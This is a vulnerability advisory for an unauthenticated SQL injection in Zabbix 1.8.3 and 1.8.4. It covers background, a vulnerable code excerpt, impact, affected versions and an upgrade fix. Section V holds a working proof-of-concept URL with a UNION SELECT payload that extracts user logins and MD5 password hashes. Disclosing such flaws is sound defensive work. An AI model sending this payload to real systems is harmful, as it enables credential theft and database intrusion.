I. VULNERABILITY
-------------------------
Zabbix <= 1.8.4 SQL Injection

II. BACKGROUND
-------------------------
Zabbix is an enterprise-class open source distributed monitoring solution.
Zabbix is software that monitors numerous parameters of a network and the
health and integrity of servers. Properly configured, Zabbix can play an
important role in monitoring IT infrastructure. This is equally true for
small organisations with a few servers and for large companies with a
multitude of servers.

III. INTRODUCTION
-------------------------
Zabbix version 1.8.3 and 1.8.4 has one vulnerability in the popup.php that
enables an attacker to perform a SQL Injection Attack. No authentication
required.

IV. VULNERABLE CODE
-------------------------

File popup.php line 1513:


$sql = 'SELECT DISTINCT hostid,host '.
    ' FROM hosts'.
    ' WHERE '.DBin_node('hostid', $nodeid).
    ' AND status IN
('.HOST_STATUS_PROXY_ACTIVE.','.HOST_STATUS_PROXY_PASSIVE.')'.
    ' ORDER BY host,hostid';
$result = DBselect($sql);


V. PROOF OF CONCEPT
-------------------------

Below is a PoC request that retrieves all logins and MD5 password hashes of
zabbix in MySQL Database:

http://localhost/zabbix/popup.php?dstfrm=form_scenario&dstfld1=application&srctbl=applications&srcfld1=name&only_hostid=-1))%20union%20select%201,group_concat(surname,0x2f,passwd)%20from%20users%23


VI. BUSINESS IMPACT
-------------------------
An attacker could exploit the vulnerability to retrieve any data from
databases accessible by zabbix db user.
In case zabbix has been given a more privileged mysql account the
exploitation could go as far as code execution.

An important remark regards the fact that the version 1.8.4 of zabbix
web software is the current version installed by the apt-get command
in debian linux distros.

VII. SYSTEMS AFFECTED
-------------------------
Versions 1.8.3 and 1.8.4 are vulnerable.

VIII. SOLUTION
-------------------------
Upgrade to version 1.8.9 that has just come out.
